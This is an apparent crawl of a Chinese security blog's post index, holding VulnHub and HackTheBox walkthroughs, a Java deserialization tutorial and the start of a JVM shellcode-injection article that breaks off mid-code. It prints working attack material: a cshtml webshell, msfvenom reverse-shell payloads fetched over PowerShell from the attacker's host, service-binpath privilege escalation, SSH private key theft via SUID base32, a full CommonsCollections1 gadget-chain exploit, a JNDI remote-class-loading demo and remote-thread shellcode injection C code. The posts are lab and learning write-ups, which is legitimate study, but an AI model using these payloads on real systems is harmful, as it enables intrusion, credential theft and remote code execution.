用base32 /root/flag.txt | base32 -d直接读flag或者base32 /root/.ssh/id_rsa | base32 -d读ssh私钥在本地导入即可。 参考Linux Privilege Escalation using SUID Binaries","link":"/2020/06/11/Geisha-walkthrough/"},{"title":"GlasgowSmile walkthrought","text":"前言这是一个中等难度的靶机，Web方面fuzz力度不够大，偷瞄了别人的walkthrough才做出来，提权方面则要细心，发现作者留下的线索。 https://www.vulnhub.com/entry/glasgow-smile-11,491/ 利用过程nmap扫了下，只开放了两个端口，22和80。 1nmap -p- -T 4 192.168.189.134 进去80的网页看到是一张小丑的壁纸，用dirb扫了下目录，发现了joomla CMS。版本比较新，前台没用爆出来公开漏洞。 1dirb http://192.168.189.134/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt 进后台使用自带的字典爆破admin和joker的弱口令，没爆出来。一筹莫展，遂瞄了下别人的walkthrough，原来是用利用主页生成的字典，爆破joomla用户的弱口令，这个是真的没想到。 1python pydictor.py -plug scratch http://192.168.189.134/joomla 将生成的字典导入到burpsuite爆破，很快就爆破出密码为Gotham。 在网上搜索到了joomla编辑模板处能改php代码和上传文件，于是插入php一句话成功Getshell。 http://192.168.189.134/joomla/administrator/index.php?option=com_templates&amp;view=templates 在templates/beez3/目录下找到了webshell。 反弹一个shell到本机，用privilege-escalation-awesome-scripts-suite没扫出来东西，查看了joomla的配置文件，发现了msyql的登录密码。 要想在mysql界面正常交互，要运行以下命令弹一个正常的shell。 1python3 -c \"import pty;pty.spawn('/bin/bash')\" 显示所有数据库发现还有个batjoke库，里面的taskforce表记录着几个用户的密码，其中rob是靶机其中一个用户。 123show databases;use batjoke;select * from taskforce; 拿密码去base64解码，结果为???AllIHaveAreNegativeThoughts???，用此密码通过ssh成功登录到rob用户。 1ssh rob@192.168.189.134 在rob用户home目录获得了第一个flag和一串密文。 看着密文的样子，以我水ctf的经验，首先就猜到了是古典密码的凯撒加密。 接着base64解码最后一行的base64，结果为I33hope99my0death000makes44more8cents00than0my0life0。 用解码的结果切换到了abner用户，获得了第二个flag，并发现history有点东西，解压了一个叫.dear_penguins.zip压缩包。 用find命令找到了压缩包的位置，解压需要密码，爆破了一番也没爆破出来，最后用abner的登录密码就正确了。 内容的最后一行同样是另一个用户penguin的登录密码，不过这回不需要解码。 去到home目录下的SomeoneWhoHidesBehindAMask目录，看见了第三flag，并且发现了两个属于root的文件。 把pspy传上靶机，发现root用户通过定时任务定时运行目录下的.trash_old。 在文件里插入反弹shell，等一会儿成功提权。","link":"/2020/06/28/GlasgowSmile_walkthrough/"},{"title":"HackTheBox Remote walkthrough","text":"… 信息收集扫描靶机开放端口，值得注意的是开放了ftp、http和共享文件服务。 1nmap -A 10.10.10.180 ftp服务允许匿名登录，但是里面没用东西。 http上的网站，通过搜索底部的关键词发现是开源的asp.net的CMS，最近一个漏洞是后台RCE。 访问共享文件访问，有一个文件夹任何人都能访问，挂载到本地发现是网站的源码。 12showmount -e 10.10.10.180sudo mount 10.10.10.180:/site_backups site_backups &lt;img src=”捕获.JPG) GETSHELL在源码的web.config里发现machineKey，但是前台好像没用到asp.net的控件，所以没派上用场。 接着又在App_Data文件夹里发现了Sql Server的数据库文件，在里面发现管理员密码的hash，拿去网上碰撞得到密码。 使用账户`admin@htb.local密码baconandcheese`在http://10.10.10.180/umbraco/处登录到后台。翻看下功能，发现个创建cshtml模板的地方，遂上个cshtml的webshell。 12345678910111213141516171819202122232425262728293031@using System.Diagnostics;@using System.IO;@functions { private string ExecuteCommand(string command) { try { ProcessStartInfo processStartInfo = new ProcessStartInfo(); processStartInfo.FileName = \"cmd.exe\"; processStartInfo.Arguments = \"/c \" + command; processStartInfo.RedirectStandardOutput = true; processStartInfo.UseShellExecute = false; Process process = Process.Start(processStartInfo); using (StreamReader streamReader = process.StandardOutput) { string ret = streamReader.ReadToEnd(); return ret; } } catch (Exception ex) { return ex.ToString(); } }}@{ if (Request.QueryString[\"p1ay2win\"] != null) { @ExecuteCommand(Request.QueryString[\"p1ay2win\"]); }} 获得第一个flag。 提权用msfvemon生产一个meterpreter的反弹shell，在本机上起一个http服务，通过powershell上传反弹shell和PowerUp提权检测脚本。 1234msfvenom -p windows/x64/meterpreter_reverse_http lhost=10.10.x.x lport=9001 -f exe -o re.exepython -m SimpleHTTPServerpowershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/re.exe&apos;,&apos;c:\\inetpub\\wwwroot\\views\\re.exe&apos;)powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/PowerUp.ps1&apos;,&apos;c:\\inetpub\\wwwroot\\views\\PowerUp.ps1&apos;) 在靶机运行反弹shell，用反弹shell的session开启一个交互的shell，运行PowerUp的invoke-allchecks功能，发现可修改UsoSvc的binpath提权。 1powershell -c &quot;import-module c:\\inetpub\\wwwroot\\views\\PowerUp.ps1;invoke-allchecks&quot; 修改UsoSvc的binpath，在重新启动这个程序的时候就能执行binpath的命令。 123sc config UsoSvc binpath=\"c:\\inetpub\\wwwroot\\views\\re.exe\"sc stop UscSvcsc start UscSvc 当时提权的时候发现个问题，binpath的命令运行一段时间就会被kill掉，找了下命令用cmd /c开头就在不被kill。 1sc config UsoSvc binpath=\"cmd /c c:\\inetpub\\wwwroot\\views\\re.exe\" 改了binpath后，start这个usosvc服务会出现failed字样，这是正常现象，命令还是会被运行。 最后，会得到一个system权限的session。没图…复现时候试了几天又reset死活登录不上… 后记hackthebox有不用下载和有windows靶机的好处，但是就是速度慢、环境经常有问题，难搞哦。","link":"/2020/08/09/HackTheBox_Remote_walkthrough/"},{"title":"JAVA反序列化学习","text":"前言回顾完PHP反序列化，接着就来学习Java反序列化了。距离上一篇PHP反序列化水文过去快半个月了，感觉时间过得好快啊，在某些特殊时刻也好煎熬啊。不管怎么说，这段时间看了好多Java反序列化的文章，也动手复现了下，对反序列化的原理、利用条件、利用方法有了初步的认识。 胡诌了这么多，就下来是对Java反序列化学习的记录。 Java序列化简介Java的序列化也是和PHP序列化一样，为了实现对象的持久化。除此之外，Java序列化还可通过的网络通信，实现在不同的平台传输对象，出现的场景有JNDI的RMI和LADP等。 Java序列化与反序列化Java不同于PHP可以序列化和反序列化任意类，Java只有本类或父类实现了Serializable或Externalizable接口，且若实例变量引用了其他对象，该对象也需要能被序列化。 12345678910111213141516171819202122public class Unserialize implements Serializable{ public Object obj; public static void main(String[] args) throws Exception { Unserialize obj = new Unserialize(); obj.obj = new SerializableTest(); FileOutputStream out = new FileOutputStream(\"test.txt\"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream(\"test.txt\"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); }}class SerializableTest implements Serializable{}class Test {} 若序列化一个没有实现Serializable的类，则会抛出NotSerializableException异常。Externalizable是Serializable的子类，序列化的用法一样，但必须重写readExternal和writeExternal方法。序列化的结果是以ACED开头的字节序列，Java也是按一定的规则进行序列化的，但序列化结果的可读性没有PHP那么高。 Java序列化并没有PHP这么多的魔术方法，只有当序列化的类重写了readObject或readExternal方法，才能作为反序列化漏洞的入口。 12345678910111213141516171819public class Unserialize implements Serializable { private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); Runtime.getRuntime().exec(\"calc\"); } public static void main(String[] args) throws Exception { Unserialize obj = new Unserialize(); FileOutputStream out = new FileOutputStream(\"test.txt\"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream(\"test.txt\"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); }} 当然，实际情况下没人会直接在readObject中写个命令执行的功能。通常情况下，反序列化漏洞都是使用多个可序列化的类形成利用链，然后利用反射机制实现想要的功能。 Java反射机制反射机制可以实现在编译时无需确定所使用的的类，在运行时再确定。对任意一个类，都能知道这个类的所有属性和方法，对任意一个对象，都能调用它的任意一个方法和属性。 以下代码是以反射的方式实现弹计算器，先后通过Class.forName获取Class实例，然后getMethod获取方法，最后invoke调用方法。对于一些需要使用实例调用的方法，首先需要通过getConstructor方法获取构造方法实例，再调用newInstance方法获取该类的实例。 12345678public class Reflect { public static void main(String[] args) throws Exception { Class runtime = Class.forName(\"java.lang.Runtime\"); Method getRuntime = runtime.getMethod(\"getRuntime\"); Method exec = runtime.getMethod(\"exec\",String.class); exec.invoke(getRuntime.invoke(runtime), \"calc\"); }} 上面形如getXXX的方法都是只能获取默认构造函数或公有方法和属性，获取非默认构造函数或非公有方法和属性需要使用形如getDeclaredXXX的方法，非公有方法和属性还需使用setAccessible方法设置可访问。 1234567891011121314151617181920212223242526public class Reflect { public static void main(String[] args) throws Exception { Class reflectTest = Class.forName(\"com.test.ReflectTest\"); Constructor constructor = reflectTest.getDeclaredConstructor(String.class); Object test = constructor.newInstance(\"calc\"); Method execute = reflectTest.getDeclaredMethod(\"execute\"); execute.setAccessible(true); execute.invoke(test); }}class ReflectTest { private String cmd; ReflectTest() { } ReflectTest(String cmd) { this.cmd = cmd; } private void execute() throws IOException { if (cmd.isEmpty()) cmd = \"calc\"; Runtime.getRuntime().exec(cmd); }} 反序列化利用反序列化利用复现经典的CommonsCollectionsPOP链，还有RMI攻击服务端和JNDI注入。 CommonsCollections1CommonsCollections1是Java反序列化利用工具ysoserial其中的一个payload，由于commons-collections这个依赖包应用很广泛，所以这个payload很通用，但对jre是有要求的，版本需要在1.7u21以下。 POP链构造，本文通过下断点调试来学习。CommonsCollections1的payload使用以下的命令生成，值得注意的是，windows下不能用powershell生成payload，生成的payload是错的，会多出来00字节。 1java -jar .\\ysoserial.jar CommonsCollections1 \"calc.exe\" &gt; cc.bin 反序列化的入口直接通过文件输入序列化内容并反序列化即可，同时需要在Runtime的exec方法下个断点。 1234567public class DebugUnserialize { public static void main(String[] args) throws Exception{ FileInputStream file = new FileInputStream(\"cc1.bin\"); ObjectInputStream in = new ObjectInputStream(file); in.readObject(); }} 启动调试就能在IDEA中看到调用栈，除去反序列化和正常invoke方法的调用，与反序列化POP链相关的调用栈有红框这三块，主要的是中间这一块。 从栈顶往栈底看，InvokerTransformer的transform方法最终反射调用Runtime的exec方法。跟进InvokerTransformer的transform方法，当input非空时会进行一个反射方式调用方法的操作。iMethodName、iParamTypes和iArgs是InvokerTransformer的属性，属于可控变量，而input不是该类的属性，此时input的值为Runtime的实例。 回溯到ChainedTransformer的transform方法，一个for循环遍历iTransformers属性，并调用他的transform方法，该方法的object参数除了第一个之外，其他都是上一个循环transform的返回值。 123456public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object;} iTransformers是一个Transformer数组，而Transformer是一个接口，上面的两个类ChainedTransformer和InvokerTransformer都实现了这个接口。当前iTransformers的大小为5，包含一个ConstantTransformer，三个InvokerTransformer，再加一个ConstantTransformer，感觉整个POP链最巧妙的就在这里。 第一个ConstantTransformer直接返回他的iConstant属性，此时iConstant为Runtime的Class实例。 接着的InvokerTransformer，经过一次getMethod再加一次反射方式调用的getMethod获取到getRuntime的Method实例，并返回。 接着的InvokerTransformer，经过两次invoke调用了上一个循环返回getRuntime方法，并返回执行结果。这里的iArgs也就是第二次的invoke的参数，是一个null和一个空Object数组，再复现时把我整懵了，为啥不用对象调用getRuntime方法。后面想起来getRuntime是静态方法，查资料得知静态方法用invoke反射调用，第一个参数传null即可。 最后一个InvokerTransformer利用上一个循环getRuntime返回的Runtime实例，反射调用exec执行命令。 继续回溯，跟进到LazyMap的get方法，map属性不存在键为key的值，然后使用factory属性调用tranform方法。这里令factory为下一调用栈里的ChainedTransformer即可。 再继续回溯，在AnnotationInvocationHandler的invoke方法里面使用调用memberValues属性调用get方法。 1234567891011121314public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else if (var5.length != 0) { throw new AssertionError(\"Too many parameters for an annotation method\"); } else { ... switch(var7) { case 0: ... default: Object var6 = this.memberValues.get(var4); AnnotationInvocationHandler是非公有的类，需要反射来构造，唯一的一个构造函数的第一个参数需要是注解的类，且存在一个接口，接口也是需要有注解，否则就会抛出一个AnnotationFormatError异常。 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); }} 在java.lang.annotaion包下很多接口都满足这个条件。 在往上回溯，发现并没有直接调用invoke方法，因为这里用到了动态代理机制，当生成的代理实例调用方法时会先调用类里的invoke方法。AnnotationInvocationHandler实现了InvocationHandler接口，所以再往上回溯又是一个AnnotationInvocationHandler，但它的memberValues属性是AnnotationInvocationHandler的代理实例。 最后完整的POC： 12345678910111213141516171819202122232425262728293031323334353637383940package com.test;import org.apache.commons.collections.*;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.*;public class ApacheCommonsCollections1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); FileOutputStream fileOutputStream = new FileOutputStream(\"cc1.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(obj); }} CommonsCollections后面几条链看了下最后都是通过transform方法反射执行命令的，就是入口类和中间衔接类不一样，CommonsCollections5也跟了下，无需动态代理，相比CommonsCollections1构造起来还更简单。 RMI攻击服务端攻击服务端的方式我看到有两种(可能还有更多的我不知道)，一种是远程方法的参数有通过类实例的，构造恶意的实例传过去；另一种是使用bind方法注册绑定一个恶意的实例。 远程方法参数有类实例 由于RMI传的参数都是经过序列化的，那么在服务端那边就会进行反序列化还原对象。这里我就想到了个问题，实现远程方法的类没有实现Serializable为什么又能被序列化呢？原因就在实现远程方法的类继承的UnicastRemoteObject类上，只要一直回溯，不难发现UnicastRemoteObject的最终父类是RemoteObject，是它实现了Serializable。 现在我们参数传一个精心构造的反序列化链就能造成反序列化漏洞，但如果这个参数的类不能作为反序列化的入口类的话，我们通过入口类继承原来的类，实现反序列化任意类。这里还是以CommonsCollections为例，但修改CommonsCollections原有的入口类挺麻烦的，Demo简化一下，服务端刚好有一个实现了Serializable的类，类里还有一个Object属性。 123 class Exploit implements Serializable { Object obj;} 服务端远程方法的参数是Exception类，那么客户端的Exploit就有稍稍修改下，继承Exception类。 123 class Exploit extends Exception implements Serializable { Object obj;} 然后客户端实例化一个Exploit对象，设置它的obj属性为CommonsCollections的POP链即可。 放上Demo的代码： 123456789101112 // 服务端RMIServer.java package com.test; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; public class RMIServer { public static void main(String[] args) throws RemoteException, AlreadyBoundException { LocateRegistry.createRegistry(8888).bind(\"method\",new RemoteMethodImpl()); }} 123456789101112131415161718192021222324//服务端RemoteMethodImpl.javapackage com.test;import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteMethodImpl extends UnicastRemoteObject implements RemoteMethod { protected RemoteMethodImpl() throws RemoteException { } @Override public String read(Exception obj) throws RemoteException { return null; }}class Exploit implements Serializable { private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); } Object obj;} 123456789 //客户端服务端相同RemoteMethod.java package com.test; import java.rmi.Remote;import java.rmi.RemoteException; public interface RemoteMethod extends Remote { public String read(Exception obj) throws RemoteException; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 //客户端利用代码 package com.test; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.map.LazyMap; import java.io.Serializable; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.rmi.registry.LocateRegistry; import java.util.*; public class Client { public static void main(String[] args) throws Exception { RemoteMethod remoteMethod = (RemoteMethod) LocateRegistry.getRegistry(8888).lookup(\"method\"); Exploit exploit = new Exploit(); exploit.obj = getPayload(); remoteMethod.read(exploit); } public static Object getPayload() throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); return obj; }} class Exploit implements Serializable { Object obj; } 在调用栈里可以看到，远程方法的参数是Exception类，反序列化的对象实际上是Exploit。 注册恶意实例 如果rmiregistry和服务端分开的话，这种情况实际攻击的是rmiregistry。rmiregistry在将注册名和Romte对象绑定时会将这两个值反序列化，可利用这个特性反序列化POP链。如果这个链入口类没有继承Remote类，可以使用动态代理的方式生成Remote的代理类。 1234567InvocationHandler obj = (InvocationHandler) getPayload();RemoteMethod remote = (RemoteMethod) Proxy.newProxyInstance( RemoteMethod.class.getClassLoader(), new Class[]{RemoteMethod.class}, obj);LocateRegistry.getRegistry(8888).rebind(\"hack\", remote); 下断点可以看到反序列化操作是在RegistryImpl_Skel类的dispatch方法进行的。 JNDI注入RMI除了绑定Remote对象之外，还可绑定ReferenceWrapper对象，ReferenceWrapper里的Reference属性记录Factory类的名称、包名和地址。当InitialContext类或他的子类对象直接或间接的调用lookup方法，同时name参数可控时，从JNDI接口获取攻击者的Reference对象，然后从攻击者的服务器下载Factory并实例化，攻击者在静态代码或构造方法加入执行命令的代码，就能在实例化的时候实现命令执行。 放上Demo代码： 123456789101112131415161718// RMIServer.javapackage com.test;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.*;public class RMIServer { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(8888); Reference reference = new Reference(\"Exploit2\", \"com.exploit.Exploit2\", \"http://127.0.0.1:8081/\"); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"calc\", wrapper); }} 1234567891011// RMIClinet.javapackage com.test;import javax.naming.*;public class RMIClient { public static void main(String[] args) throws Exception { Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:8888/calc\"); }} 恶意的Factory类： 1234567891011121314151617package com.exploit;import java.io.IOException;class Exploit2 { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } Exploit2() throws Exception { Runtime.getRuntime().exec(\"calc\"); }} 同时起一个python的SimpleHTTPServer，来作为Factroy类的下载服务。这里有一个坑，一开始我是直接http://127.0.0.1:8081/Exploit2.class下载Factroy类，在测试中虽然发起了下载请求，但并没有弹计算器，一度以为我的代码写得有问题，参考了别人的Demo代码，factroyLocation设置的是下载服务的根目录，用SimpleHTTPServer测试下，请求的地址会变为http://127.0.0.1:8081/com/exploit/Exploit2.class，所以下载目录要跟报名相同或者请求任意地址都下载Factroy才行。 万事俱备，开调。 前两个lookup方法都是套娃调用，直接跟进到RegistryContext的lookup方法。使用绑定的ReferenceWrapper和对应的Name调用decodeObject方法。 跟进到decodeObject方法，获取Reference对象，并使用Reference对象和Name对象调用getObjectInstance方法。 123456private Object decodeObject(Remote var1, Name var2) throws NamingException { try { Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; return NamingManager.getObjectInstance(var3, var2, this, this.environment); ...} getObjectInstance方法里又继续通过Reference对象和factory类名调用getObjectFactoryFromReference方法获取对象。接着跟进getObjectFactoryFromReference方法，有两个地方调用loadClass，此时的调用栈是第二个loadClass。第一个loadClass是从当前classPath获取类的Class实例。如果恶意类和客户端同在一个项目，需要把恶意类编译后的.class文件删掉才会从远程下载恶意类。后续如clas为null，也就是本地没这个factory类时，获取codebase，也就是初始化Reference时的factoryName属性，调用另一个loadClass方法。 123456789101112131415161718192021222324static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class&lt;?&gt; clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } 跟进第二个loadClass，通过URLClassLoader的newInstance生成远程类的ClassLoader，然后使用ClassLoader反射生成factory类的Class实例。在实例化Class的实例的时候，静态代码就会被执行，弹出计算器。 除了RMI，LDAP也是可以使用类似的方式实例化远程的恶意类，这两种利用方法都写在后续较高的Java版本被限制从远程下载并实例化factory类。 com.sun.jndi.ldap.object.trustURLCodebase 属性在 Oracle JDK 11.0.1, 8u191, 7u201, and 6u211及以后的版本，默认值为false，即不允许LDAP从远程地址加载Reference工厂类。 com.sun.jndi.rmi.object.trustURLCodebase 属性在 Oracle JDK 8u113, 7u122, 6u132及以后的版本，默认值为false，即默认不允许RMI从远程地址加载Reference工厂类。 后记距发布上一篇文章24天，你文章写快点吧大哥，炒冷饭搞这么久。后续复现下一些组件、CMS的反序列化漏洞。 参考https://github.com/bit4woo/code2sec.com https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#5-2-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86 https://yoga7xm.top/2019/09/02/rmi/ https://paper.seebug.org/1091/#java-rmi_3 https://paper.seebug.org/1420/#_2 https://www.redteaming.top/2020/08/24/JNDI-Injection/","link":"/2021/08/24/JAVA反序列化学习/"},{"title":"JVM Shellcode注入探索","text":"前言随着RASP技术的发展，普通webshell已经很难有用武之地，甚至是各种内存马也逐渐捉襟见肘。秉承着《JSP Webshell那些事——攻击篇（上）》中向下走的思路，存不存在一种在Java代码中执行机器码的方法呢？答案是肯定的，常见的注入方式有JNI、JNA和利用JDK自带的Native方法等，其中笔者还找到了一种鲜有文章介绍的，基于HotSpot虚拟机，且较为通用的注入方法。 基于JNIJava底层虽然是C/C++实现的，但不能直接执行C/C++代码。若想要执行C/C++的代码，一般得通过JNI，即Java本地调用（Java Native Interface），加载JNI链接库，调用Native方法实现。 Cobalt Strike官网博客上有一篇《如何从Java注入shellcode》的文章，便是基于JNI实现，通过Native方法调用C/C++代码将shellcode注入到内存中。 1234567//C/C++代码中声明的函数对应Demo#inject本地方法JNIEXPORT void JNICALL Java_Demo_inject(JNIEnv * env, jobject object, jbyteArray jdata) { jbyte * data = (*env)-&gt;GetByteArrayElements(env, jdata, 0); jsize length = (*env)-&gt;GetArrayLength(env, jdata); inject((LPCVOID)data, (SIZE_T)length); (*env)-&gt;ReleaseByteArrayElements(env, jdata, data, 0);} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//执行注入shellcode的代码/* inject some shellcode... enclosed stuff is the shellcode y0 */void inject(LPCVOID buffer, int length) { STARTUPINFO si; PROCESS_INFORMATION pi; HANDLE hProcess = NULL; SIZE_T wrote; LPVOID ptr; char lbuffer[1024]; char cmdbuff[1024]; /* reset some stuff */ ZeroMemory( &amp;si, sizeof(si) ); si.cb = sizeof(si); ZeroMemory( &amp;pi, sizeof(pi) ); /* start a process */ GetStartupInfo(&amp;si); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdOutput = NULL; si.hStdError = NULL; si.hStdInput = NULL; /* resolve windir? */ GetEnvironmentVariableA(\"windir\", lbuffer, 1024); /* setup our path... choose wisely for 32bit and 64bit platforms */ #ifdef _IS64_ _snprintf(cmdbuff, 1024, \"%s\\\\SysWOW64\\\\notepad.exe\", lbuffer); #else _snprintf(cmdbuff, 1024, \"%s\\\\System32\\\\notepad.exe\", lbuffer); #endif /* spawn the process, baby! */ if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) return; hProcess = pi.hProcess; if( !hProcess ) return; /* allocate memory in our process */ ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); /* write our shellcode to the process */ WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&amp;wrote); if (wrote != length) return; /* create a thread in the process */ CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);} 这种方法需要自行编写个链接库，并上传到受害服务器上，利用起来并不显得优雅。 还有另一种方法是利用JNA第三方库，可以直接调用内核的函数，实现Shellcode注入。在@yzddmr6师傅的Java-Shellcode-Loader项目中有实现，但JNA本质上还是基于JNI，使用时还是要加载JNA自己的链接库，并且JDK中默认不包含JNA这个类库，使用时需要想办法引入。 基于JDK自带的Native方法第一个介绍的可能是冰蝎的作者@rebeyond师傅首先发现的方法，一种基于JDK自带的Native方法的shellcode注入，严格来说是基于HotSpot虚拟机的JDK的自带Native方法。它是sun/tools/attach/VirtualMachineImpl#enqueueNative方法，存在于用于attach Java进程的tools.jar包中。 当运行在Windows上时，相应的enqueue Native方法实现在/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c中，其中Create thread in target process to execute code的操作，不能说跟前面Cobalt Strike注入shellcode的操作毫不相干，只能说是一模一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546JNIEXPORT void JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd, jstring pipename, jobjectArray args){ ... /* * Allocate memory in target process for data and code stub * (assumed aligned and matches architecture of target process) */ hProcess = (HANDLE)handle; pData = (DataBlock*) VirtualAllocEx( hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE ); if (pData == NULL) { JNU_ThrowIOExceptionWithLastError(env, \"VirtualAllocEx failed\"); return; } WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&amp;data, (SIZE_T)sizeof(DataBlock), NULL ); stubLen = (DWORD)(*env)-&gt;GetArrayLength(env, stub); stubCode = (*env)-&gt;GetByteArrayElements(env, stub, &amp;isCopy); if ((*env)-&gt;ExceptionOccurred(env)) return; pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if (pCode == NULL) { JNU_ThrowIOExceptionWithLastError(env, \"VirtualAllocEx failed\"); VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); return; } WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL ); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); /* * Create thread in target process to execute code */ hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pCode, pData, 0, NULL ); ...} 当然你不能说这个是bug，只能说是feature。 相应的Demo是比较简单，在stub参数中传入shellcode即可，@rebeyond师傅已经给出了代码，笔者在这里做了点简化。不过实现Native方法的链接库attach.dll默认存在，但tools.jar这个包不一定存在，@rebeyond师傅巧妙的利用了双亲委派机制，当JVM中没有加载VirtualMachineImpl类时，就会使用下面base64编码的类替代。当然这种方法仅适用于Windows，因为Linux下enqueue并不是这么实现的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.io.ByteArrayOutputStream;import java.lang.reflect.Method;import java.util.Base64;public class WindowsAgentShellcodeLoader { public static void main(String[] args) { try { String classStr = 